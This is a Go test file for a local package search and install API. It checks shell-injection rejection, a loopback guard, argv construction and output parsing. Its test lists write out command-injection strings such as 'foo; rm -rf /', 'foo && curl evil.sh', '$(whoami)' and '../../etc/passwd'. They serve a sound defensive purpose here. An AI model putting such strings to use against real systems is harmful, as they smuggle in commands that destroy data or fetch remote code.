package handlers

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"strings"
	"testing"
)

func pkgSearchMux() http.Handler {
	mux := http.NewServeMux()
	NewPackageSearchHandler().Register(mux)
	return mux
}

// loopbackPost builds a POST request that passes the loopback guard.
func loopbackPost(path, body string) *http.Request {
	req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(body))
	req.RemoteAddr = "127.0.0.1:54321"
	return req
}

// TestPackageSearchRejectsInjection asserts that queries carrying shell
// metacharacters or whitespace are rejected before any command runs.
func TestPackageSearchRejectsInjection(t *testing.T) {
	origRun := pkgSearchRunner
	t.Cleanup(func() { pkgSearchRunner = origRun })

	ran := false
	pkgSearchRunner = func(_ context.Context, _ string, _ []string) ([]byte, error) {
		ran = true
		return nil, nil
	}

	mux := pkgSearchMux()
	injections := []string{
		"foo; rm -rf /",
		"foo && curl evil.sh",
		"foo | sh",
		"$(whoami)",
		"`id`",
		"foo bar",
		"../../etc/passwd",
		"foo\nbar",
		"",
		"foo;",
		"--flag",
	}
	for _, q := range injections {
		body, _ := json.Marshal(map[string]string{"manager": "brew", "query": q})
		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, loopbackPost("/api/system/package-search", string(body)))
		if rec.Code != http.StatusBadRequest {
			t.Errorf("query %q: status = %d, want 400", q, rec.Code)
		}
	}
	if ran {
		t.Fatalf("search command ran despite an invalid query — sanitization bypassed")
	}
}

// TestPackageSearchUnknownManager rejects a manager with no vetted search spec.
func TestPackageSearchUnknownManager(t *testing.T) {
	mux := pkgSearchMux()
	body, _ := json.Marshal(map[string]string{"manager": "evil", "query": "ripgrep"})
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, loopbackPost("/api/system/package-search", string(body)))
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", rec.Code)
	}
}

// TestPackageSearchHappyPath runs a valid query against a stubbed brew and
// checks the parsed results and the exact argv the handler built.
func TestPackageSearchHappyPath(t *testing.T) {
	origRun := pkgSearchRunner
	t.Cleanup(func() { pkgSearchRunner = origRun })

	var gotBin string
	var gotArgs []string
	pkgSearchRunner = func(_ context.Context, bin string, args []string) ([]byte, error) {
		gotBin, gotArgs = bin, args
		return []byte("ripgrep\nripgrep-all\n==> Casks\n"), nil
	}

	mux := pkgSearchMux()
	body, _ := json.Marshal(map[string]string{"manager": "brew", "query": "ripgrep"})
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, loopbackPost("/api/system/package-search", string(body)))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200: %s", rec.Code, rec.Body.String())
	}
	if gotBin != "brew" || len(gotArgs) != 2 || gotArgs[0] != "search" || gotArgs[1] != "ripgrep" {
		t.Fatalf("argv = %q %q, want brew [search ripgrep]", gotBin, gotArgs)
	}
	var resp struct {
		Results []searchResult `json:"results"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(resp.Results) != 2 || resp.Results[0].Name != "ripgrep" {
		t.Fatalf("results = %+v, want [ripgrep ripgrep-all]", resp.Results)
	}
}

// TestPackageSearchLoopbackGuard rejects non-loopback callers.
func TestPackageSearchLoopbackGuard(t *testing.T) {
	mux := pkgSearchMux()
	body, _ := json.Marshal(map[string]string{"manager": "brew", "query": "ripgrep"})
	req := httptest.NewRequest(http.MethodPost, "/api/system/package-search", strings.NewReader(string(body)))
	req.RemoteAddr = "203.0.113.5:9999"
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403", rec.Code)
	}
}

// TestPackageInstallRejectsInjection asserts install package names are
// charset-validated before any command runs.
func TestPackageInstallRejectsInjection(t *testing.T) {
	origRun := pkgInstallRunner
	t.Cleanup(func() { pkgInstallRunner = origRun })
	ran := false
	pkgInstallRunner = func(ctx context.Context, _ string, _ []string) *exec.Cmd {
		ran = true
		return exec.CommandContext(ctx, "true")
	}

	mux := pkgSearchMux()
	// Includes argv-level attacks the charset must stop: leading-hyphen flag
	// injection (-g / --force), bare or traversal paths (owner/repo, a/../../b,
	// ./x, /etc/x) — none are the documented plain-name or @scope/name forms.
	for _, pkg := range []string{
		"foo; rm -rf /", "$(id)", "foo bar", "foo|sh", "",
		"--force", "-g", "a/../../b", "owner/repo", "./x", "/etc/x",
		"foo/", "/foo", "a//b", "@/x", "@scope//pkg",
	} {
		body, _ := json.Marshal(map[string]string{"manager": "brew", "package": pkg})
		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, loopbackPost("/api/system/package-install", string(body)))
		if rec.Code != http.StatusBadRequest {
			t.Errorf("package %q: status = %d, want 400", pkg, rec.Code)
		}
	}
	if ran {
		t.Fatalf("install command ran despite an invalid package name")
	}
	// The two documented shapes must still pass validation (they reach the
	// stubbed runner, so no real install happens).
	for _, pkg := range []string{"ripgrep", "@scope/pkg", "foo.bar_baz+1"} {
		body, _ := json.Marshal(map[string]string{"manager": "npm", "package": pkg})
		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, loopbackPost("/api/system/package-install", string(body)))
		if rec.Code != http.StatusOK {
			t.Errorf("valid package %q: status = %d, want 200", pkg, rec.Code)
		}
	}
}

// TestPackageInstallUnknownManager rejects managers without a direct installer.
func TestPackageInstallUnknownManager(t *testing.T) {
	mux := pkgSearchMux()
	// apt has a search spec but no direct installer (needs sudo) — must 400.
	body, _ := json.Marshal(map[string]string{"manager": "apt", "package": "ripgrep"})
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, loopbackPost("/api/system/package-install", string(body)))
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", rec.Code)
	}
}

// TestPackageInstallStreams runs a valid install against a stubbed command and
// checks the NDJSON stream carries the exact argv and completes.
func TestPackageInstallStreams(t *testing.T) {
	origRun := pkgInstallRunner
	t.Cleanup(func() { pkgInstallRunner = origRun })

	var gotBin string
	var gotArgs []string
	pkgInstallRunner = func(ctx context.Context, bin string, args []string) *exec.Cmd {
		gotBin, gotArgs = bin, args
		// Harmless stand-in that emits a line and exits 0.
		return exec.CommandContext(ctx, "printf", "installing\\n")
	}

	mux := pkgSearchMux()
	body, _ := json.Marshal(map[string]string{"manager": "npm", "package": "@scope/pkg"})
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, loopbackPost("/api/system/package-install", string(body)))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}
	if gotBin != "npm" || strings.Join(gotArgs, " ") != "install -g @scope/pkg" {
		t.Fatalf("argv = %q %q, want npm [install -g @scope/pkg]", gotBin, gotArgs)
	}
	if !strings.Contains(rec.Body.String(), `"type":"done"`) {
		t.Fatalf("stream missing done event: %s", rec.Body.String())
	}
}

func TestPkgManagerSearchable(t *testing.T) {
	if !pkgManagerSearchable("brew") || !pkgManagerSearchable("npm") {
		t.Fatalf("brew/npm should be searchable")
	}
	if pkgManagerSearchable("pipx") {
		t.Fatalf("pipx has no search spec and must not be searchable")
	}
}

func TestPkgSearchParsers(t *testing.T) {
	if got := parseNpmParseable("react\tA library\tfoo\t2020\t18.0\n\nreact-dom\tDOM\n"); len(got) != 2 || got[0].Name != "react" || got[0].Description != "A library" {
		t.Fatalf("npm parse = %+v", got)
	}
	if got := parseColonDesc("ripgrep - fast grep\nheader\n"); len(got) != 1 || got[0].Name != "ripgrep" || got[0].Description != "fast grep" {
		t.Fatalf("apt parse = %+v", got)
	}
	if got := parsePacman("extra/ripgrep 13.0-1\n    Fast grep\ncore/foo 1.0\n    A foo\n"); len(got) != 2 || got[0].Name != "ripgrep" || got[0].Description != "Fast grep" {
		t.Fatalf("pacman parse = %+v", got)
	}
	if got := parseCargo("ripgrep = \"13.0.0\"    # fast grep\n... and more\n"); len(got) != 1 || got[0].Name != "ripgrep" || got[0].Description != "fast grep" {
		t.Fatalf("cargo parse = %+v", got)
	}
}
